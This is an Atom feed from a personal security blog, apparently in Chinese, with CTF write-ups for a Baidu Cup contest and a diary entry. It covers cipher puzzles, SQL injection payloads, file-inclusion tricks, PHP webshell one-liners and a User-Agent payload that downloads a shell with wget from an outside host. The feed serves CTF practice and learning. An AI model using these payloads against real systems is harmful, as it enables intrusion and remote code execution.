<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lhaihai&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.Lhaihai.wang/"/>
  <updated>2018-08-10T12:27:51.225Z</updated>
  <id>http://blog.Lhaihai.wang/</id>
  
  <author>
    <name>Lhaihai</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018年8月</title>
    <link href="http://blog.Lhaihai.wang/2018/08/10/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA/"/>
    <id>http://blog.Lhaihai.wang/2018/08/10/百度杯 十二月场/</id>
    <published>2018-08-10T12:06:47.000Z</published>
    <updated>2018-08-10T12:27:51.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><blockquote><p>话不多说，看图片 </p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/misc1.jpg" alt="misc1"></p><a id="more"></a><p>16进制查看，在最后</p><blockquote><p> flag{stego_is_s0_bor1ing} </p></blockquote><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/kaixin.jpg" alt="kaixin"></p><p>试了几种隐写发现不对，看看writeup，说是猪圈密码</p><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。 </p><p><img src="https://static2.ichunqiu.com/icq/resources/fileupload/1517198320154.png" alt="undefined"> </p><blockquote><p>flag{NSN}</p></blockquote><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><blockquote><p>哒哒哒哒，你知道什么是键盘坐标密码吗？</p><p>11 21 31 18 27 33 34</p><p>flag格式：flag{<strong>*</strong>}</p></blockquote><blockquote><p>flag{QAZIJCV}</p></blockquote><h2 id="一个十六岁的少年"><a href="#一个十六岁的少年" class="headerlink" title="一个十六岁的少年"></a>一个十六岁的少年</h2><blockquote><p>有一天，表姐的好朋友贝丝远房的表亲，一个16岁的少年</p><p>给表姐递了一封情书，表姐看不懂，你能帮忙翻译下吗？</p><p>666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D</p></blockquote><p>base16</p><blockquote><p>flag{ec8b2ee0-3ae9-4c21-a012-08aa5fa7be67}</p></blockquote><h2 id="吃货"><a href="#吃货" class="headerlink" title="吃货"></a>吃货</h2><blockquote><p>麻辣烫的标配</p><p>flag{abbab_babbb_baaaa_aaabb}</p></blockquote><p>培根密码</p><blockquote><p>flag{N_X_Q_D}</p></blockquote><h2 id="福尔摩斯"><a href="#福尔摩斯" class="headerlink" title="福尔摩斯"></a>福尔摩斯</h2><blockquote><p>贝克街旁的圆形广场</p><p>·-· ·-· ·-· ·-· ·-· ·-· ·</p><p>flag格式：flag{<strong><strong>*</strong></strong>}</p></blockquote><blockquote><p>flag{RRRRRRE}</p></blockquote><h2 id="——"><a href="#——" class="headerlink" title="+——+"></a>+——+</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- --.+. ----- -.&lt;++</span><br><span class="line">+++++ [-&gt;++ +++++ &lt;]&gt;++ ++.-- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- .----</span><br><span class="line">--.++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; --.++ +++.+ +++.- .&lt;+++ +++[- &gt;++++ ++&lt;]&gt;</span><br><span class="line">+++++ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ---.+ +++++ +.+++ ++.-- ----- .&lt;+++</span><br><span class="line">++++[ -&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- .&lt;+++ ++++[</span><br><span class="line">-&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;.++ ++.-- -.--- -.&lt;++ +++++</span><br><span class="line">[-&gt;++ +++++ &lt;]&gt;++ ++.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- ---.- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ..&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.-- -.+.+ ++.-- ---.+</span><br><span class="line">++++. ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;</span><br></pre></td></tr></table></figure><p>brankfuck在线解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><blockquote><p>flag{671fb608-265a-492f-a041-b30bb8569490}</p></blockquote><h2 id="misc1-纵横四海"><a href="#misc1-纵横四海" class="headerlink" title="misc1-纵横四海"></a>misc1-纵横四海</h2><blockquote><p>有句话说的好</p><p>（大表姐最美）</p><p>。</p><p>。</p><p>。</p><p>。</p><p>。</p><p>天下分久必合，合久必分</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/BSRC12-4/tiaoxiwoya_F738231D64472CF1476F941699E20618.zip" target="_blank" rel="noopener">附件下载</a> </p></blockquote><p>附件解压是很多txt，每个txt有一个字符</p><p>写个python把它们合在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/8/10</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : misc1-纵横四海</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r'F:\CTF\I春秋的CTF大本营\百度杯十二月场\MISC\tiaoxiwoya'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(path, topdown=<span class="keyword">False</span>):</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">with</span> open(os.path.join(root, name)) <span class="keyword">as</span> f:</span><br><span class="line">            flag += f.readline()[:<span class="number">1</span>]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for name in dirs:</span></span><br><span class="line">    <span class="comment">#     print(os.path.join(root, name))</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{0a47061d-0619-4932-abcd-5426f4ea34aa}</p></blockquote><h2 id="misc2-对错"><a href="#misc2-对错" class="headerlink" title="misc2-对错"></a>misc2-对错</h2><blockquote><p>如果说1代表对，0代表错，那么-1代表？ </p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/BSRC12-4/duicuo_DCA74A67DC1C2C2A43E6F7F0AE6236DE.txt" target="_blank" rel="noopener">附件下载</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101111010011010000100010101100011001110010011000000110011001101000110101001101111011001000111001101101010011001100110111101110011011010110110111101111101</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(int(&apos;011001100110110001100001011001110111101101111010011010000100010101100011001110010011000000110011001101000110101001101111011001000111001101101010011001100110111101110011011010110110111101111101&apos;,2))</span><br><span class="line">&apos;0x666c61677b7a684563393033346a6f64736a666f736b6f7dL&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; binascii.a2b_hex(&apos;666c61677b7a684563393033346a6f64736a666f736b6f7d&apos;)</span><br><span class="line">&apos;flag&#123;zhEc9034jodsjfosko&#125;&apos;</span><br></pre></td></tr></table></figure><blockquote><p>flag{zhEc9034jodsjfosko}</p></blockquote><h2 id="misc3-枯竭"><a href="#misc3-枯竭" class="headerlink" title="misc3-枯竭"></a>misc3-枯竭</h2><blockquote><p>讲真的，才华已经枯竭</p><p>大家好好答题</p><p>也许这道题一点都不坑</p><p>也许。。。。。</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/BSRC12-4/misc3_BDAE109BD7B51BF98BA9BB501C0F45C2.zip" target="_blank" rel="noopener">附件下载</a></p></blockquote><p><code>也许</code> 后面的五个点暗示五位数</p><p>ARCHPR 暴力破解一下五位数的数字</p><blockquote><p>flag{319b7f63-e17d-4ac5-8428-c2476c7ecce3}</p></blockquote><h2 id="藏在邮件头里的秘密"><a href="#藏在邮件头里的秘密" class="headerlink" title="藏在邮件头里的秘密"></a>藏在邮件头里的秘密</h2><blockquote><p> flag{ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6} </p></blockquote><p>可打印字符编码(Quoted_Printable)</p><p> <a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/QuotedPrintable.aspx</a>  </p><p><a href="http://blog.chacuo.net/494.html" target="_blank" rel="noopener"><strong>Quoted-printable</strong></a>可译为“可打印字符引用编码”，编码常用在电子邮件中，如：Content-Transfer-Encoding: quoted-printable ，它是MIME编码常见一种表示方法！ 在邮件里面我们常需要用可打印的ASCII字符 (如字母、数字与”=”)表示各种编码格式下的字符！Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”=0C”， 等号”=”（十进制值为61）必须表示为”=3D”，gb2312下“中”表示为=D6=D0。除了可打印ASCII字符与换行符以外，所有字符必须表示为这种格式。因为Quoted-printable编码简单、方便因此在电子邮件中应用广泛！ </p><blockquote><p>flag{ichunqiu_技术有温度}</p></blockquote><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h2><blockquote><p>请帮我测试一下刚写的Blog </p></blockquote><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul><li>kindeditor编辑器目录遍历，</li><li>insert注入</li><li>文件包含</li></ul><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>上传个图片，爆出编辑器为kindeditor</p><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533874138592.png" alt="1533874138592"></p><p>搜一下kindeditor编辑器的漏洞，有个目录遍历漏洞</p><p><a href="https://www.jb51.net/hack/367858.html" target="_blank" rel="noopener">Kindeditor遍历目录0DAY问题</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/67cms/kindeditor/php/file_manager_json.php?path=../</span><br></pre></td></tr></table></figure><p>发现flag.php在网站根目录，还有个robots.txt，打开也是暗示flag.php</p><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533874524721.png" alt="1533874524721"></p><p>然后思路就是怎么读取flag.php</p><p>发现post.php 有注入点</p><p>在content参考后加 单引号出错</p><p>猜想后台sql语句形似:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO TABLENAME(A,B,C) VALUES($A,$B,$C);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title=111&amp;content=111&apos;)#          出错</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;)#      成功</span><br></pre></td></tr></table></figure><p>那么猜测 insert的参数有四个，第四个参数没有在页面显示出来，就控制content来显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(X, title,content,username)</span><br></pre></td></tr></table></figure><p>insert注入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">测试成功，但页面没有出现内容</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;aaa&apos;,&apos;X&apos;,&apos;X&apos; ,&apos;xx&apos;)#       </span><br><span class="line">出现内容，最后一个为用户名</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihaiaaaaaaaaaaaaaaaaaaaaaa&apos;,&apos; &apos; ,&apos;Lhaihai&apos;)#</span><br><span class="line">显示数据库为miniblog</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(database()) ,&apos;Lhaihai&apos;)#</span><br><span class="line">爆表  posts,users</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(select group_concat(table_name) from information_schema.tables where table_schema = database()) ,&apos;Lhaihai&apos;)#</span><br><span class="line">爆users字段:username,password</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273) ,&apos;Lhaihai&apos;)#</span><br><span class="line">爆post字段: id,title,content,username</span><br><span class="line"></span><br><span class="line">爆出密码</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(select group_concat(password) from users) ,&apos;Lhaihai&apos;)#</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">dbb616c5d935d8f34c12c291066d6fb7</span><br></pre></td></tr></table></figure><p>md5解密得密码 </p><blockquote><p>melody123 </p></blockquote><p>管理员账号登录，多了个manager.php</p><p>module参数可以包含并且可以用php://filter协议可直接读 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b0a5692172d24de4b205c5d66faf7a5162182fa8404d4518.game.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</span><br></pre></td></tr></table></figure><blockquote><p>PD9waHAgCidmbGFne2E1N2NiYTgxLWNhMDgtNDRlYS1hOWY1LWRhNDZmYjVkNDAxY30nOwplY2hvICdmbGFnX2lzX2hlcmUnOwo=</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="string">'flag&#123;a57cba81-ca08-44ea-a9f5-da46fb5d401c&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag_is_here'</span>;</span><br></pre></td></tr></table></figure><p>做了两遍发现flag是随机的</p><blockquote><p>flag{a57cba81-ca08-44ea-a9f5-da46fb5d401c}</p><p>flag{a8f3801d-27e8-45aa-9f80-0b7bd6d72c1e}</p></blockquote><p>参考链接</p><p><a href="https://blog.csdn.net/qq_30123355/article/details/58161312" target="_blank" rel="noopener">https://blog.csdn.net/qq_30123355/article/details/58161312</a></p><p><a href="https://www.cnblogs.com/Ragd0ll/p/8778562.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ragd0ll/p/8778562.html</a></p><h2 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h2><blockquote><p>看看我的Notebook</p><p>tips： 文件包含phpinfo是不是有新的发现</p></blockquote><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><ul><li>包含session</li><li>session真正位置</li><li>文件包含漏洞 </li></ul><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h5><p>open_basedir 将<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 </p><h5 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h5><ol><li>/var/lib/php5/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ol><p>PHPSESSID就是Cookie的PHPSESSID的值</p><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533897832368.png" alt="1533897832368"></p><h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><p>登录注册题目，一般思路就是注入，如果不是注入就是session漏洞  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f4adf1900e344025b41f951eef0cac04db4d0a6e32914a48.game.ichunqiu.com/action.php?module=php&amp;file=login</span><br></pre></td></tr></table></figure><p>看一下url，module，file参数，疯狂暗示文件包含</p><p>测试一波，发现module的php部分换成其他任何的值，我们都可以控制要包含文件的后缀，默认php的情况下，是会在file后面加上php的。 </p><p>尝试一下robots.txt </p><p>提示：php1nFo.php</p><p>访问就是phpinfo();</p><p>发现开启了open_basedir:    /var/www/html/:/tmp </p><blockquote><p>open_basedir 将<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 </p></blockquote><p>再看看</p><p>session.save_path 是    /var/lib/php5</p><p>这时session.save_path不在open_basedir里面，我们不能包含session文件</p><p>脑洞一下包含php1nFo，发现新目录，而且在open_basedir范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action.php?module=php&amp;file=php1nFo</span><br></pre></td></tr></table></figure><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533897637938.png" alt="1533897637938"></p><p>所以我们session文件就保存在 <code>tmp/SESS/sess_PHPSESSID</code>里</p><p>如果题目信息没有给session保存的路径，可以猜测知识点的几个值</p><p>访问一下，</p><p>会出现当前登录的用户名</p><p>于是我们注册一个一句话木马的用户，就可以getshell了</p><p>创建一个 <code>&lt;?php $_GET[&#39;a&#39;](base64_decode($_GET[&#39;b&#39;]));?&gt;</code>用户</p><blockquote><p>这里为什么要用base64解码呢<br>我尝试eval的一句话木马，执行不了<br>或许被过滤了什么的</p><p><code>&lt;?php eval(base64_decode($_GET[&#39;b&#39;]));?&gt;</code></p><p>可以执行phpinfo();，但system(‘ls ./‘)不执行成功</p><p><code>&lt;?php eval($_GET[&#39;Lhaihai&#39;]);?&gt;</code></p><p>一句话木马也是能执行phpinfo();，不能system</p><p>或者直接这样子也可以</p><p><code>&lt;?php system(base64_decode($_GET[&#39;b&#39;]));?&gt;</code></p><p>再试试</p><p><code>&lt;?php system($_GET[&#39;b&#39;]);?&gt;</code></p><p>发现这个也可以</p><p>所以就是eval()函数不成功 ？？？</p></blockquote><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533895701193.png" alt="1533895701193"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://f4adf1900e344025b41f951eef0cac04db4d0a6e32914a48.game.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_0bk9ojm7oh28jpjarr08aduc24&amp;a=system&amp;b=bHMgLi8K</span><br><span class="line"></span><br><span class="line">http://f4adf1900e344025b41f951eef0cac04db4d0a6e32914a48.game.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_0bk9ojm7oh28jpjarr08aduc24&amp;a=system&amp;b=Y2F0IGZsYWcucGhwCg==</span><br></pre></td></tr></table></figure><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533887640624.png" alt="1533887640624"></p><p><img src="F:\CTF\I春秋的CTF大本营\百度杯十二月场\百度杯 十二月场.assets\1533887669933.png" alt="1533887669933"></p><blockquote><p>flag{87e7131d-0650-4e69-a48b-ee4f1a21da39}</p></blockquote><p>参考链接</p><p><a href="https://bbs.ichunqiu.com/thread-16750-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-16750-1-1.html</a></p><p><a href="https://blog.csdn.net/qq_31481187/article/details/52602454" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/52602454</a></p><p><a href="https://www.cnblogs.com/Oran9e/p/8082962.html" target="_blank" rel="noopener">CTF PHP文件包含–session</a></p><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank" rel="noopener">php文件包含漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;misc1&quot;&gt;&lt;a href=&quot;#misc1&quot; class=&quot;headerlink&quot; title=&quot;misc1&quot;&gt;&lt;/a&gt;misc1&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;话不多说，看图片 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/misc1.jpg&quot; alt=&quot;misc1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>2018年8月</title>
    <link href="http://blog.Lhaihai.wang/2018/08/10/2018%E5%B9%B48%E6%9C%88/"/>
    <id>http://blog.Lhaihai.wang/2018/08/10/2018年8月/</id>
    <published>2018-08-10T11:06:47.000Z</published>
    <updated>2018-08-10T11:53:45.004Z</updated>
    
    <content type="html"><![CDATA[<p>向老王学习，从我做起</p><a id="more"></a><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><h3 id="启动蚁剑"><a href="#启动蚁剑" class="headerlink" title="启动蚁剑"></a>启动蚁剑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm start</span><br></pre></td></tr></table></figure><h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="proc/self/environ"></a>proc/self/environ</h3><h3 id="LFI通过proc-self-environ直接获取webshell"><a href="#LFI通过proc-self-environ直接获取webshell" class="headerlink" title="LFI通过proc/self/environ直接获取webshell"></a><a href="https://blog.csdn.net/god_7z1/article/details/7904789" target="_blank" rel="noopener">LFI通过proc/self/environ直接获取webshell</a></h3><p>选择User-Agent 写代码如下：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?system(&apos;wget http://hack-bay.com/Shells/gny.txt -O shell.php&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>然后提交请求。        </p><p>我们的命令将被执行(将下载<a href="http://hack-bay.com/Shells/gny.txt" target="_blank" rel="noopener">http://hack-bay.com/Shells/gny.txt</a>，并将其保存为它在shell.php网站目录) </p><p><a href="http://www.am0s.com/penetration/131.html" target="_blank" rel="noopener">如何优雅的把lfi转化为rce（2017-02-27更新版）</a></p><h3 id="phpinfo知识点"><a href="#phpinfo知识点" class="headerlink" title="phpinfo知识点"></a>phpinfo知识点</h3><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>open_basedir 将<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 </p><h4 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h4><ol><li>/var/lib/php5/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ol><h3 id="透過-LFI-引入-PHP-session-檔案觸發-RCE"><a href="#透過-LFI-引入-PHP-session-檔案觸發-RCE" class="headerlink" title="透過 LFI 引入 PHP session 檔案觸發 RCE"></a><a href="https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></h3><p>當遇到 LFI 漏洞時，可以先檢查一下幾種可能的檔案：</p><ol><li>/etc/passwd</li><li>/proc/self/environ</li><li>All possible config files ( e.g. Apache /etc/httpd/conf/httpd.conf )</li><li>Web server access, error log ( e.g. /etc/httpd/logs/access_log )</li><li>Session files ( e.g. /tmp/sess_{SESSION_ID} )</li></ol><p>PHP 使用 <code>$_GET[1]、$_POST[1]</code>可以避開引號跳脫的問題(前面提到事後得知$_GET[b]即可正常執行)。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;向老王学习，从我做起&lt;/p&gt;
    
    </summary>
    
      <category term="Diary" scheme="http://blog.Lhaihai.wang/categories/Diary/"/>
    
    
  </entry>
  
  <entry>
    <title>python3的二进制十六进制ASCII转换</title>
    <link href="http://blog.Lhaihai.wang/2018/08/10/python%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6ASCII%E8%BD%AC%E6%8D%A2/"/>
    <id>http://blog.Lhaihai.wang/2018/08/10/python的二进制十六进制ASCII转换/</id>
    <published>2018-08-09T16:51:19.000Z</published>
    <updated>2018-08-09T16:52:59.756Z</updated>
    
